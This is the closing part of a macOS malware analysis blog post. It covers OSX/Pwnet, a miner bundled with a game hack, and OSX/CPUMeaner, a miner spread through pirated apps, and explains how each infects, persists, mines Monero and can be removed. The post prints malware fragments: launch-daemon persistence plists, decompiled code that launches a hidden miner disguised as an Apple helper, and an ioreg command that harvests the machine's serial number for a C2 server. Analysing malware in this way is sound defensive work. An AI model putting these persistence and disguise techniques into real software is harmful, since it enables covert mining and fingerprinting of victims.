    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch daemon and miner</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:center;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <a class="inlineLink" href="https://www.sentinelone.com/blog/osx-pwnet-a-csgo-hack-and-sneaky-miner/">"Osx.Pwnet.A - CS: GO hack and sneaky miner"</a> (SentinelOne)

    </td>
  </tr>
  </tbody>
  </table>
  <br>
  Arnaud Abbati (<a class="inlineLink" href="https://twitter.com/@noarfromspace">@noarfromspace</a>) who uncovered Pwnet, describes it as a, <i>"trojan that could mine CryptoCurrencies without user consent"</i> embedded in a hack for Counter-Strike: Global Offensive.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  Arnaud notes that the infection vector for Pwnet begins at vlone.cc. Though this portal now appears offline, in the past users could login in to download a hack for the popular game, 'Counter-Strike Global Offensive'.
  <br>
  <br>
  The main binary, (<span class="n3rdFont">vhook</span>) is not signed:
  <br><br>
    <span><img src="../images/blog/blog_0x25/vhook.png" width="820px;" style="display:block; margin:auto;"/></span>
  <br> 
  ...and must be run with root privileges: 
  <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont"><pre>
  $ ./vhook
  
  Root access required!
  Please type "sudo ./vhook"</pre>
  </span>
  </div>
  <br>
  In the background, Arnaud states that, <i>"<span class="n3rdFont">vHook</span> also sneaky downloads and extracts <span class="n3rdFont">https://vlone.cc/abc/assets/asset.zip</span> as <span class="n3rdFont">fonts.zip</span> to <span class="n3rdFont">/var/</span>, changes directory to <span class="n3rdFont">/var</span> and runs <span class="n3rdFont">sudo ./helper &</span>."</i>
  <br>
  <br>
  This binary, <span class="n3rdFont">helper</span> downloads yet more components (such as <span class="n3rdFont">com.dynamsoft.WebHelper</span>), which in turn download still more items. (For details see Arnaud's writeup: <a class="inlineLink" href="https://www.sentinelone.com/blog/osx-pwnet-a-csgo-hack-and-sneaky-miner/">"Osx.Pwnet.A - CS: GO hack and sneaky miner"</a>). The end result is OSX/Pwnet being persistently installed.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  The final action of the installer, is to download a binary named <span class="n3rdFont">WebTwainService</span> (from <span class="n3rdFont">https://www.vlone.cc/abc/assets/d.zip</span>), is persisted as a launch daemon via <span class="n3rdFont">com.dynamsoft.WebTwainService.plist</span>:
  <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont"><pre>
  $ cat com.dynamsoft.WebTwainService.plist

  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; ...&gt;
  &lt;plist version=&quot;1.0&quot;&gt;
  &lt;dict&gt;
          &lt;key&gt;StandardErrorPath&lt;/key&gt;
          &lt;string&gt;/var/log/webtwain.log&lt;/string&gt;
          &lt;key&gt;StandardOutPath&lt;/key&gt;
          &lt;string&gt;/var/log/webtwain.log&lt;/string&gt;
          &lt;key&gt;KeepAlive&lt;/key&gt;
          &lt;false/&gt;
          &lt;key&gt;Label&lt;/key&gt;
          &lt;string&gt;com.dynamsoft.WebTwainService&lt;/string&gt;
          &lt;key&gt;RunAtLoad&lt;/key&gt;
          &lt;true/&gt;
          &lt;key&gt;ProgramArguments&lt;/key&gt;
          &lt;array&gt;
                  &lt;string&gt;/var/.log/WebTwainService&lt;/string&gt;
          &lt;/array&gt;
  &lt;/dict&gt;
  &lt;/plist&gt;</pre>
  </span>
  </div>
  <br>
  As the <span class="n3rdFont">'RunAtLoad'</span> key is set to true, the value in the <span class="n3rdFont">'ProgramArguments'</span> (<span class="n3rdFont">/var/.log/WebTwainService</span>), will be automatically executed by the OS each time the infected computer is restarted.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
  </div>
  The main goal of Pwnet is to mine cryptocurrency via an official minergate command line tool. 
  <br>
  <br>
  First, the malware's persistent daemon, <span class="n3rdFont">WebTwainService</span>, executes the <span class="n3rdFont">com.dynamsoft.webhelper</span> binary:

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont"><pre>
  int _main(int arg0, int arg1) 
  {
    var_18 = objc_autoreleasePoolPush();
    <b>system("cd /var/.log/;sudo ./com.dynamsoft.WebHelper &");</b>
    objc_autoreleasePoolPop(var_18);
    goto loc_100000b27;

  loc_100000b27:
    sleep(0xe10);
    goto loc_100000b27;
  }</pre>
    </span>
    </div>
  <br>
  As Arnaud notes in his writeup, <span class="n3rdFont">com.dynamsoft.webhelper</span>, performs various actions including executing the minergate cli (which Pwnet names: <span class="n3rdFont">'com.apple.SafariHelper'</span>):

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont">
      cd /var/.trash/.assets/; <b>./com.apple.SafariHelper</b>
    </span>
  </div>
  <br>
  When the miner <span class="n3rdFont">'com.apple.SafariHelper'</span> is executed, it eats up all CPU cycles in order to mine XMR (Monero).
  <br>
  <br>

  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  To remove OSX/Pwnet, first unload and remove its persistent launch daemon plist:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont"><pre>
  $ launchctl unload /Library/LaunchDaemons/com.dynamsoft.WebTwainService.plist

  $ rm /Library/LaunchDaemons/com.dynamsoft.WebTwainService.plist</pre>
  </span>
  </div>
  <br>
  <br>
  Then delete all installed components, which are stored in various 'hidden' directory in under<span class="n3rdFont">/var/</span> such as: 
  <ul style="list-style-type:square">
      <li><span class="n3rdFont">/Library/LaunchDaemons/com.dynamsoft.WebTwainService.plist</span></li>
      <li><span class="n3rdFont">/var/.log/</span></li>
      <li><span class="n3rdFont">/var/.trash/</span></li>
      <li><span class="n3rdFont">/var/.old</span></li>
  </ul>
  Finally if the miner binary (<span class="n3rdFont">'com.apple.SafariHelper'</span>) is running, terminate it!



  <!-- CPUMeaner -->

  <br>
  <br>
  <a id="CpuMeaner"></a>
  <table>
  <thead>
  <tr style="border:none;">
    <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
    <img src="../images/blog/blog_0x25/cpuMeaner.png" width="32" style="padding-top: 10px;"/> 
    <span style="display: inline-block; vertical-align: top; padding-top: 12px; font-variant: small-caps; font-size: 20px;">
    CPUMeaner
    </span>
    </th>
  </tr>
  </thead>
  <tbody>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">November, SentinelOne</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">trojanized pirated applications</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">cryptocurrency miner</td>
  </tr>
  <tr>
    <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>disinfection:</b></td>
    <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">remove launch agent and miner</td>
  </tr>

  <tr style="border:none;">
    <td style="border:none; vertical-align:center;"><b>writeups:</b></td>
    <td style="border:none;">
      
      <a class="inlineLink" href="https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/">"OSX.CPUMeaner: New Cryptocurrency Mining Trojan Targets Macos"</a> (SentinelOne)

    </td>
  </tr>
  </tbody>
  </table>
  <br>
  OSX/CPUMeaner is a cryptocurrency miner that targets macOS users. Arriving in pirated applications, it mines Monero. 
  <br>
  <br>
  Arnaud Abbati (<a class="inlineLink" href="https://twitter.com/@noarfromspace">@noarfromspace</a>) who uncovered CPUMeaner, provides an <a class="inlineLink" href="https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/">in-depth technical writeup</a> on the malware.
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/infection.png" height="32">
      <span style="vertical-align:middle">infection:</span>
  </div>
  Arnaud notes that the infection vector for CPUMeaner can come from a variety of sources.

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont">
     "<i>Individuals using pirated software could end up with malware from a variety of sources including a simple Google search and a YouTube video with a malicious link in its description. In the middle of technical support scams, fake Flash players, and recommended virus scans, the victim could end up with a malicious package.</i>"
    </span>
  </div>

  <br><br>
    <span><img src="../images/blog/blog_0x25/cpuMeanerPkg.jpg" width="820px;" style="display:block; margin:auto;"/></span>
  <br> 
  At this time, Apple has revoked the certificate used to sign (at least some instances of) the malware:
  <br><br>
    <span><img src="../images/blog/blog_0x25/cpuMeanerRevoked.png" width="820px;" style="display:block; margin:auto;"/></span>
  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/persistence.png" height="32">
      <span style="vertical-align:middle">persistence:</span>
  </div>
  When the user runs the malicious installer (<span class="n3rdFont">.pkg</span>), it will execute the package's 'post install' script. Using the neat 
  <a class="inlineLink" href="http://www.mothersruin.com/software/SuspiciousPackage">'Suspicious Package'</a> application, we can statically examine this script:
  <br><br>
    <span><img src="../images/blog/blog_0x25/cpuMeanerInstall.png" width="820px;" style="display:block; margin:auto;"/></span>
  <br>
  In short, it persists CPUMeaner as a launch agent via the <span class="n3rdFont">/Library/LaunchAgents/com.osxext.cpucooler.plist</span> file. As the <span class="n3rdFont">'RunAtLoad'</span> key is set to <span class="n3rdFont">true</span>, whenever the system is rebooted and the user logs in, whatever is specified in <span class="n3rdFont">Program</span> key will be automatically executed by the OS. Examining this key, we can see it's set to <span class="n3rdFont">/Library/Application Support/CpuCooler/cpucooler</span>:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
      INSTALL_LOCATION="<b>/Library/Application Support/CpuCooler/cpucooler</b>"
      <br>
      <br>
      ...
      <br>
      &lt;key&gt;Program&lt;/key&gt;
      <br>
      &lt;string>'$INSTALL_LOCATION'&lt;/string&gt;
    </span>
  </div>

  <br>
  <br>
  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/features.png" height="32">
      <span style="vertical-align:middle">features:</span>
  </div>
  The main goal of CPUMeaner is to mine cryptocurrency. Arnaud determined that cpucooler is a "custom builds of XMRig version 2.3.1, an open-source Monero CPU miner"
  <br>
  <br>
  Though the author added some extra functionality to obfuscate strings, Arnaud wrote a deobfuscation python script:

  <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  $ decrypt_strings.py cpucooler
  
  ioreg -rd1 -w0 -c AppleAHCIDiskDriver 
    | awk '/Serial Number/{gsub("\"", "", $4);print $4}'

  jumpcash.xyz

  
  stratum+tcp://xmr.pool.minergate.com:45560
  jeffguyen@mail.com</pre>
  </span>
  </div>
  <br>
  These deobfuscated strings (plus binary analysis) confirm that binary, <span class="n3rdFont">cpucooler</span> is a cryptominer, which will <i>"mine on MinerGate XMR pool for jeffguyen@mail.com."</i>
  <br>
  <br>
  Besides pegging your CPU to mine cryptocurrency, CPUMeaner also pings a remote server, <span class="n3rdFont">jumpcash.xyz</span> with some installation data. This may include infected system's serial number - as grabbed by the output of the (deobfuscated) ioreg command:

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
  <span class="n3rdFont"><pre>
  ioreg -rd1 -w0 -c AppleAHCIDiskDriver 
    | awk '/Serial Number/{gsub("\"", "", $4);print</pre>
  </span>
  </div>
  <br>
  <br>

  <div>
      <img style="vertical-align:middle" src="../images/blog/blog_0x25/disinfect.png" height="32">
      <span style="vertical-align:middle">disinfection:</span>
  </div>
  To remove CPUMeaner, first unload and remove its persistent launch agent plist:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont"><pre>
  $ launchctl unload /Library/LaunchAgents/com.osxext.cpucooler.plist

  $ rm /Library/LaunchAgents/com.osxext.cpucooler.plist</pre>
  </span>
  </div>
  <br>
  Then delete the miner binary, <span class="n3rdFont">/Library/Application Support/CpuCooler/</span>. Finally if the miner binary (<span class="n3rdFont">cpucooler</span>) is running, terminate it!
  <br>
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px; font-size: 14px;">
    <span class="n3rdFont"><pre>
  Note: 

  There are other variants of CPUMeaner such as 'XMemApp' that may install the 
  cryptocurrency miner to other locations.

  See Arnaud's excellent <a class="inlineLink" href="https://www.sentinelone.com/blog/osx-cpumeaner-miner-trojan-software-pirates/">writeup</a> for details on these variants.</pre>
  </span>
  </div>
    
  <br>
  <br>

	<span style="color: #95c02d; font-weight: bold;">Thanks</span><br>
	I briefly want to thank the following fellow malware analysts/macOS reversers! Their research and assistance has been paramount to my own research, conference talks, and the advancement of my macOS knowledge:
	<ul style="list-style-type:square">
			<li><a class="inlineLink" href="https://twitter.com/0xAmit">@0xAmit</a></li>
			<li><a class="inlineLink" href="https://twitter.com/Morpheus______">@Morpheus______</a></li>
			<li><a class="inlineLink" href="https://twitter.com/noarfromspace">@noarfromspace</a></li>
			<li><a class="inlineLink" href="https://twitter.com/osxreverser">@osxreverser</a></li>
			<li><a class="inlineLink" href="https://twitter.com/theJoshMeister">@theJoshMeister</a></li>
			<li><a class="inlineLink" href="https://twitter.com/thomasareed">@thomasareed</a></li>
	</ul>
  <br>
	<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts &amp; tools? you can support them via <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a>! Mahalo :) 
		<br>
		</span>
		</div>
		<br>
		<br>
		<br>
		</span>
		</div>
	</section>	
</div>		

<!-- footer, copyright notice and social media icons -->
<nav role="footer">
<ul>
	<li class="copyright">&copy; 2018 objective-see llc</li>
	<li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon ss-social">&#x2709;</span></a></li>
	<li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon ss-social">&#xF611;</span></a></li>
	<li><a href="../rss.xml" class="menubutton icon"><span class="ss-icon">&#xE310;</span></a></li>
	<li>
        <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px;">support!</a>
    </li>
</ul>
</nav>

</body>
</html>
